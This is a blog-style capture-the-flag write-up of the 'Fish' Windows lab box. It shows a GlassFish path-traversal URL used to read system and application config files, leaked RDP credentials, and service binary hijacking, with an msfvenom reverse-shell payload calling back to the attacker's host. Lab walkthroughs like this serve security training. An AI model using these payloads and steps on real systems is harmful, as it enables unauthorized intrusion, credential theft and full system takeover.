+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/writeups/" title="Write-ups">
+                    <span>Write-ups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/publications/" title="Publications &amp; Talks">
+                    <span>Publications &amp; Talks</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="whoami">
+                    <span>whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      PG Practice - Fish
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-06-26 00:00:00 +0000 UTC'>June 26, 2026</span>&nbsp;·&nbsp;<span>5 min</span>&nbsp;·&nbsp;<span>Fabio Birnegger</span>
+
+</div>
+  </header> 
+<figure class="entry-cover">
+        <img loading="eager" src="http://localhost:1313/images/writeup_screens/pg_fish/pg_fish_cover.svg" alt="Cover">
+        
+</figure>
+  <div class="post-content md-content"><p><strong>Box Details</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th></th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Difficulty</td>
+          <td>Intermediate</td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Windows</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>Port Scan</strong></p>
+<pre tabindex="0"><code>└─$ nmap -sV -sC -p- 192.168.216.168
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-26 19:30 +0200
+Nmap scan report for 192.168.216.168
+Host is up (0.043s latency).
+Not shown: 65516 closed tcp ports (reset)
+PORT      STATE SERVICE              VERSION
+135/tcp   open  msrpc                Microsoft Windows RPC
+139/tcp   open  netbios-ssn          Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server        Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: FISHYYY
+|   NetBIOS_Domain_Name: FISHYYY
+|   NetBIOS_Computer_Name: FISHYYY
+|   DNS_Domain_Name: Fishyyy
+|   DNS_Computer_Name: Fishyyy
+|   Product_Version: 10.0.19041
+|_  System_Time: 2021-10-29T11:56:13+00:00
+| ssl-cert: Subject: commonName=Fishyyy
+| Not valid before: 2021-10-28T11:48:50
+|_Not valid after:  2022-04-29T11:48:50
+|_ssl-date: 2021-10-29T11:56:26+00:00; -4y240d05h38m29s from scanner time.
+3700/tcp  open  giop
+| fingerprint-strings: 
+|   GetRequest, X11Probe: 
+|     GIOP
+|   giop: 
+|     GIOP
+|     (IDL:omg.org/SendingContext/CodeBase:1.0
+|     169.254.240.58
+|     169.254.240.58
+|_    default
+4848/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
+|_http-server-header: GlassFish Server Open Source Edition  4.1 
+|_http-title: Login
+5040/tcp  open  unknown
+6060/tcp  open  x11?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Accept-Ranges: bytes
+|     ETag: W/&#34;425-1267803922000&#34;
+|     Last-Modified: Fri, 05 Mar 2010 15:45:22 GMT
+|     Content-Type: text/html
+|     Content-Length: 425
+|     Date: Fri, 29 Oct 2021 11:53:47 GMT
+|     Connection: close
+|     Server: Synametrics Web Server v7
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;META HTTP-EQUIV=&#34;REFRESH&#34; CONTENT=&#34;1;URL=app&#34;&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;script type=&#34;text/javascript&#34;&gt;
+|     &lt;!--
+|     currentLocation = window.location.pathname;
+|     if(currentLocation.charAt(currentLocation.length - 1) == &#34;/&#34;){
+|     window.location = window.location + &#34;app&#34;;
+|     }else{
+|     window.location = window.location + &#34;/app&#34;;
+|     //--&gt;
+|     &lt;/script&gt;
+|     Loading Administration console. Please wait...
+|     &lt;/body&gt;
+|     &lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 403 
+|     Cache-Control: private
+|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
+|     Set-Cookie: JSESSIONID=F4D252ADE9DDCA2C4DAC70358D0337E9; Path=/
+|     Content-Type: text/html;charset=ISO-8859-1
+|     Content-Length: 5028
+|     Date: Fri, 29 Oct 2021 11:53:48 GMT
+|     Connection: close
+|     Server: Synametrics Web Server v7
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;meta http-equiv=&#34;content-type&#34; content=&#34;text/html; charset=UTF-8&#34; /&gt;
+|     &lt;title&gt;
+|     SynaMan - Synametrics File Manager - Version: 5.1 - build 1595 
+|     &lt;/title&gt;
+|     &lt;meta NAME=&#34;Description&#34; CONTENT=&#34;SynaMan - Synametrics File Manager&#34; /&gt;
+|     &lt;meta NAME=&#34;Keywords&#34; CONTENT=&#34;SynaMan - Synametrics File Manager&#34; /&gt;
+|     &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=10&#34; /&gt;
+|     &lt;link rel=&#34;icon&#34; type=&#34;image/png&#34; href=&#34;images/favicon.png&#34;&gt;
+|     &lt;link type=&#34;text/css&#34; rel=&#34;stylesheet&#34; href=&#34;images/AjaxFileExplorer.css&#34;&gt;
+|     &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34;
+|   JavaRMI: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Length: 145
+|     Date: Fri, 29 Oct 2021 11:53:42 GMT
+|     Connection: close
+|     Server: Synametrics Web Server v7
+|_    &lt;html&gt;&lt;head&gt;&lt;title&gt;Oops&lt;/title&gt;&lt;body&gt;&lt;h1&gt;Oops&lt;/h1&gt;&lt;p&gt;Well, that didn&#39;t go as we had expected.&lt;/p&gt;&lt;p&gt;This error has been logged.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
+7676/tcp  open  java-message-service Java Message Service 301
+7680/tcp  open  pando-pub?
+8080/tcp  open  http                 Sun GlassFish Open Source Edition  4.1
+|_http-server-header: GlassFish Server Open Source Edition  4.1 
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Data Web
+| http-methods: 
+|_  Potentially risky methods: PUT DELETE TRACE
+8181/tcp  open  ssl/intermapper?
+| ssl-cert: Subject: commonName=localhost/organizationName=Oracle Corporation/stateOrProvinceName=California/countryName=US
+| Not valid before: 2014-08-21T13:30:10
+|_Not valid after:  2024-08-18T13:30:10
+|_ssl-date: TLS randomness does not represent time
+8686/tcp  open  java-rmi             Java RMI
+| rmi-dumpregistry: 
+|   jmxrmi
+|     javax.management.remote.rmi.RMIServerImpl_Stub
+|     @169.254.240.58:8686
+|     extends
+|       java.rmi.server.RemoteStub
+|       extends
+|_        java.rmi.server.RemoteObject
+49664/tcp open  msrpc                Microsoft Windows RPC
+49665/tcp open  msrpc                Microsoft Windows RPC
+49666/tcp open  msrpc                Microsoft Windows RPC
+49667/tcp open  msrpc                Microsoft Windows RPC
+49668/tcp open  msrpc                Microsoft Windows RPC
+49669/tcp open  msrpc                Microsoft Windows RPC
+</code></pre><p><strong>GlassFish Server Open Source Edition  4.1</strong> running on port <strong>4848</strong> is vulnerable to LFI. This <a href="https://www.exploit-db.com/exploits/39441">public exploit</a> works and with the following URL we can read <em>win.ini</em>:</p>
+<pre tabindex="0"><code>http://192.168.216.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini
+</code></pre><p><img loading="lazy" src="/images/writeup_screens/pg_fish/pg_fish1.png"></p>
+<p>On port <strong>6060</strong> a <strong>SynaMan 5.1</strong> instance is running. Through a short online research i found out that the path to the application configuration is <em>C:\SynaMan\config\AppConfig.xml</em>. I tried to access this file with the LFI vulnerability in the <strong>Glassfish</strong> instance:</p>
+<pre tabindex="0"><code>http://192.168.216.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afSynaMan/config/AppConfig.xml
+</code></pre><p><img loading="lazy" src="/images/writeup_screens/pg_fish/pg_fish2.png"></p>
+<p>In the file we can find some SMPT clear-text credentials:</p>
+<pre tabindex="0"><code>arthur:KingOfAtlantis
+</code></pre><p>I tried to connect to the target via RDP using these credentials which was successful:</p>
+<pre tabindex="0"><code>└─$ xfreerdp3 /v:192.168.216.168 /u:arthur /p:KingOfAtlantis +clipboard /cert:ignore /dynamic-resolution
+</code></pre><p>In the RDP session i could simply read <em>local.txt</em> on the desktop.</p>
+<hr>
+<h2 id="root">Root<a hidden class="anchor" aria-hidden="true" href="#root">#</a></h2>
+<p>I was looking for non-default running services in order to perform Windows binary hijacking. I found a <strong>GlassFish</strong> domain service which looked interesting:</p>
+<pre tabindex="0"><code>&gt; Get-CimInstance -ClassName win32_service | Select Name,State,StartName,PathName | Where-Object {$_.State -like &#39;Running&#39;}
+</code></pre><p><img loading="lazy" src="/images/writeup_screens/pg_fish/pg_fish3.png"></p>
+<p>Looking at the file permissions we can see that any authenticated user is able to modify the binary:</p>
+<pre tabindex="0"><code>&gt; icacls C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe
+</code></pre><p><img loading="lazy" src="/images/writeup_screens/pg_fish/pg_fish4.png"></p>
+<p>The start mode of the binary is <em>auto</em> which means it automatically starts when booting the machine:</p>
+<pre tabindex="0"><code>&gt; Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &#39;domain1&#39;}
+</code></pre><p><img loading="lazy" src="/images/writeup_screens/pg_fish/pg_fish5.png"></p>
+<p>Our user has the <em>SeShutdownPrivilege</em> which means we are privileged to reboot the machine:</p>
+<pre tabindex="0"><code>&gt; whoami /priv
+</code></pre><p><img loading="lazy" src="/images/writeup_screens/pg_fish/pg_fish6.png"></p>
+<p>We have all preconditions met to be able to perform service binary hijacking. We now have to create a EXE payload:</p>
+<pre tabindex="0"><code>└─$ msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=192.168.45.159 LPORT=4444 -f exe -o exploit.exe
+</code></pre><p>After transfering it to our target we have to replace the vulnerable binary with our <em>exploit.exe</em>:</p>
+<pre tabindex="0"><code>PS C:\Program Files (x86)\TotalAV&gt; move C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe C:\Users\arthur\Documents\
+
+PS C:\Program Files (x86)\TotalAV&gt; move C:\Users\arthur\exploit.exe C:\glassfish4\glassfish\domains\domain1\bin\domain1Service.exe
+</code></pre><p>Now we only have to start a netcat listener in our kali and reboot the target:</p>
+<pre tabindex="0"><code>shutdown /r /t 0
+</code></pre><p>After a few seconds I received a <em>SYSTEM</em> reverse shell in my listener and could read <em>C:\Users\Administrator\Desktop\proof.txt</em>.</p>
+<blockquote>
+<p>I later found out that the privilege escalation vector described here wasn&rsquo;t the intended way. The installed <strong>TotalAV</strong> version was vulnerable to a malicious DLL quarantine attack as described <a href="https://www.exploit-db.com/exploits/47897">here</a>. However, in my case, <strong>TotalAV</strong> was expired so I couldn&rsquo;t quarantine anything and thus the intended way wouldn&rsquo;t have worked. After resetting the machine, <strong>TotalAV</strong> was functional as the window showed <em>expiring in 6 days</em>. I assume there was an error when generating my target instance the first time as I could&rsquo;ve followed the intended path only after a reset.</p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/proving-grounds-practice/">Proving Grounds Practice</a></li>
+      <li><a href="http://localhost:1313/tags/windows/">Windows</a></li>
+      <li><a href="http://localhost:1313/tags/write-up/">Write-Up</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/writeups/pg_shenzi/">
+    <span class="title">Next »</span>
+    <span>PG Practice - Shenzi</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Fabio Birnegger</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
